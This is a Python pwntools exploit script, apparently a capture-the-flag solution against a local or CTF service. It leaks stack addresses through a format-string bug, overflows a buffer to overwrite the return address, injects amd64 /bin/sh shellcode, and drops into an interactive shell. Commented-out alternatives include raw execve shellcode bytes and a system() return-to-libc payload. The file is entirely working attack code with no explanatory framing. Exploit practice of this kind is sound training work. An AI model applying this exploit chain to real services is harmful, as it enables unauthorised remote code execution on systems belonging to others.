import binascii
import re
import sys

from pwn import *
from pwnlib import shellcraft
from pwnlib.runner import run_assembly

# context.clear(arch='amd64')
context.arch='amd64'

write = sys.stdout.buffer.write

host = '127.0.0.1'
port = 8888
# host = 'csie.ctf.tw'
# port = 10122

r = remote(host, port)

# payload = str.encode(cyclic(40))
# payload += p64(callme)

input('press enter to continue')

def get_stacks(beg, end, scanf_arg=b'llx'):
    print('='*20)
    print('getting from {} to {} in stacks'.format(beg, end))
    print('='*20)

    names = []
    for num in range(beg, end):
        # 1 - Send name
        r.recvuntil('>')
        r.sendline(b'1')
        r.recvuntil(':')
        r.sendline(b'%' + str(num).encode('utf-8') + b'$' + scanf_arg)
        # 2 - Show info
        r.recvuntil('>')
        r.sendline(b'2')
        r.recvuntil(':')
        name = r.recvuntil('*')[:-1]
        names += [name]
        print(num, end=' ')
    print('')
    return names

def input_to_overflow(payload):
    print('='*20)
    print('input to overflow')
    print('='*20)

    # Gets
    r.recvuntil('>')
    r.sendline(b'3')
    r.recvuntil(':')
    r.sendline(payload)

"""
get address
"""
stacks = get_stacks(1, 100)
shell_addr = int(stacks[23], 16) + 2101984
main_addr = shell_addr - 2102304
# # 1 - Send name
# r.recvuntil('>')
# r.sendline(b'1')
# r.recvuntil(':')
# r.sendline(b'%18$p')
# # 2 - Show info
# r.recvuntil('>')
# r.sendline(b'2')
# r.recvuntil(':')
# shell_addr = r.recvuntil('*')[:-1]
# shell_addr = int(shell_addr, 16) + 2101984

print('address: {}'.format(format(shell_addr, '0x')))

# shell_addr = last_name

"""
overflow return address
"""
stacks = get_stacks(6, 100)
write(b' '.join(stacks))
print('')

stacks = [p64(int(stack, 16)) for stack in stacks]
payload = b''.join(stacks[:19])

# payload = cyclic(192).encode('utf-8')

# sh = 0x7ffff7a21eb0
# system_addr = 0x7ffff7a556a0
# payload += p64(system_addr) + b'AAAAAAAA' + p64(sh)
# write(payload + b'\n')

# shell_addr = 0x7ffff7dd36b8
payload += p64(shell_addr)
input_to_overflow(payload)
stacks = get_stacks(6, 100)
write(b' '.join(stacks))
print('')

"""
insert shellcode
"""
# shell = b'\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05'
# shell = b'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'
# shell = b'AAAAAAAA'
# 1 - Send name
r.recvuntil('>')
r.sendline(b'1')
r.recvuntil(':')
# r.sendline(shell)
r.sendline(asm(shellcraft.amd64.linux.sh()))

"""
call return
"""
# Exit
r.recvuntil('>')
r.sendline(b'4')

r.interactive()
